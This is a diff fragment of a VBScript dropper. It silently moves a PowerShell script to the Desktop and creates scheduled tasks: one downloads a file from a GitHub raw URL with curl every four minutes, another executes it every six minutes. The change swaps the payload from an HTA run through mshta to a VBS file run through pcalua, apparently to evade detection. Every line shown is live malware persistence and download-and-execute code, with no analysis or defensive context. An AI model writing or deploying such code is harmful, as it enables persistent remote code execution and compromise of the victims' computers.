@@ -11,10 +11,10 @@ Set sz = CreateObject("WScript.Shell")
 sz.Run ("cmd /c move %tmp%\R1.ps1 %USERPROFILE%\Desktop\R1.ps1"), 0, True
 
 Set sy = CreateObject("WScript.Shell")
-sy.Run ("schtasks /Create /sc minute /mo 4 /tn ""A5"" /tr ""curl https://raw.githubusercontent.com/section10housing/b1/master/z3.txt -o %tmp%\z3.hta"" /F"), 0, False
+sy.Run ("schtasks /Create /sc minute /mo 4 /tn ""A5"" /tr ""curl https://raw.githubusercontent.com/section10housing/b1/master/z3.txt -o %tmp%\z3.vbs"" /F"), 0, False
 
 Set s1 = CreateObject("WScript.Shell")
-s1.Run ("schtasks /Create /sc minute /mo 6 /tn ""A6"" /tr ""mshta %tmp%\z3.hta"" /F"), 0, False
+s1.Run ("schtasks /Create /sc minute /mo 6 /tn ""A6"" /tr ""pcalua -a %tmp%\z3.vbs"" /F"), 0, False
 
 
 
